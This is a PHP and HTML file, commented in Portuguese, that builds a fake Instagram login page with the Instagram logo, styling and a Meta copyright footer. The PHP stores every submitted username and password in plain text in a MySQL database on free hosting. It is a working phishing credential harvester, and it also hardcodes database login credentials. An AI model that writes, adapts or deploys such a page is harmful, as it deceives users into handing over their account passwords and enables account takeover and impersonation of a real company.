<?php
// Conexão com o banco de dados no InfinityFree
$host = "sql306.infinityfree.com "; // Substitua pelo host correto do seu banco
$usuario = "if0_38564531"; // Substitua pelo seu usuário do InfinityFree
$senha = "vMpwYol7NwWdntv"; // Substitua pela sua senha do banco de dados
$banco = "if0_38564531_XXX"; // Substitua pelo nome correto do banco de dados

$conn = new mysqli($host, $usuario, $senha, $banco);

// Verifica se houve erro na conexão
if ($conn->connect_error) {
    die("<p class='erro'>Erro ao conectar ao banco de dados: " . $conn->connect_error . "</p>");
}

// Mensagem para exibir sucesso/erro
$mensagem = "";

// Se o formulário for enviado, salva os dados no banco
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["usuario"];
    $senha = $_POST["senha"];

    // Proteção contra SQL Injection (recomendado)
    $usuario = $conn->real_escape_string($usuario);
    $senha = $conn->real_escape_string($senha);

    // Insere os dados no banco sem criptografia (apenas para testes)
    $sql = "INSERT INTO usuarios (usuario, senha) VALUES ('$usuario', '$senha')";

    if ($conn->query($sql) === TRUE) {
        $mensagem = "<p class='sucesso'>Cadastro realizado com sucesso!</p>";
    } else {
        $mensagem = "<p class='erro'>Erro ao salvar os dados. Tente novamente.</p>";
    }
}

// Fecha a conexão com o banco
$conn->close();
?>

<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login alternativo por Instagram</title>
    <link rel="stylesheet" href="instagram.css">
</head>
<body>
    <div class="login-wrapper">
        <div class="login-container">
            <img src="instagram-logo.png" alt="Instagram" class="logo">
            
            <?php echo $mensagem; ?>

            <form action="login.php" method="post">
                <input type="text" name="usuario" placeholder="Telefone, nome de usuário ou email" required>
                <input type="password" name="senha" placeholder="Senha" required>
                <button type="submit">Entrar</button>
            </form>

            <p class="ou">OU</p>

            <a href="#" class="login-facebook">Entrar com Facebook</a>

            <p class="esqueceu"><a href="#">Esqueceu a senha?</a></p>
        </div>

        <div class="cadastro-container">
            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
        </div>

        <div class="footer">
            <p>© 2025 Instagram from Meta</p>
        </div>
    </div>
</body>
</html>
